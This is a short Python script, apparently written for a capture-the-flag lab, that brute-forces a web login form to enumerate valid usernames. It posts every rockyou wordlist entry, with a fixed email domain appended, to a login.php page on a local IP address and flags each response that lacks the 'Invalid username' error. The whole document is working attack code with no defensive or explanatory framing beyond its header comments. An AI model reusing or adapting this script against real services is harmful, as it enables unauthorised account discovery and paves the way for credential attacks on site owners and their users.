#################################################################
#Objective:
# Brute-force for login enumeration
#Description:
# POST request to try to log on the application
#Date:
# 16/03/2017
#################################################################

import requests

#wordfile to use 
wordfile = "/root/ctf/wordlist/rockyou.txt"
wd = open(wordfile)

#content return when username error 
match='Invalid username, please try again.'

#credentials
#entry = 'admin@seattlesounds.net'
#entry = entry.rstrip("\n") 
mail = '@seattlesounds.net' 
password = 'random'

#target URL 
url = "http://192.168.0.4/login.php"

#to know how much username has already been tested
i=0

for entry in wd:
        entry = entry.rstrip("\n")
        entry = entry + mail

        #data to be include when requesting 
        datas = {'password':password,'usermail':entry}
        #cookie to be include when requesting 
        cookie = {'level':'1'}
        request = requests.post(url, data = datas, cookies = cookie).text

        if match not in request:
                print(entry,': login correct')

        i=i+1
        if i%1000==0:
                print('Line',i)
